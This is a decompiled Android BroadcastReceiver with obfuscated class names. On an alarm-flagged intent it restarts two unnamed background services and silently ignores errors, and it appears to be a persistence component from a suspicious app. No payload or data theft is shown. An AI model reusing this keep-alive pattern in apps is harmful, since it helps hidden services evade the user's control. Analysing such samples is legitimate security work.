/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 */
package linker.resourcer.encoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import linker.resourcer.encoder.Vmqwemkv$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.qswemlflptdlumxqnjrlg;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;

public class Vmqwemkv
extends BroadcastReceiver {
    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    static /* synthetic */ void lambda$onReceive$0(Intent intent, Context context) {
        if (!intent.getBooleanExtra("FROM_ALARM", false)) return;
        try {
            intent = new Intent(context, qswemlflptdlumxqnjrlg.class);
            if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, qswemlflptdlumxqnjrlg.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
            if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class)) {
                intent = new Intent(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                    return;
                }
                context.startService(intent);
                return;
            }
        }
        catch (Exception exception) {
            // empty catch block
            return;
        }
        try {
            intent = new Intent(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class);
            intent.putExtra("FROM_ALARM", true);
            context.startService(intent);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            new Thread(new Vmqwemkv$$ExternalSyntheticLambda0(intent, context)).start();
        }
    }
}

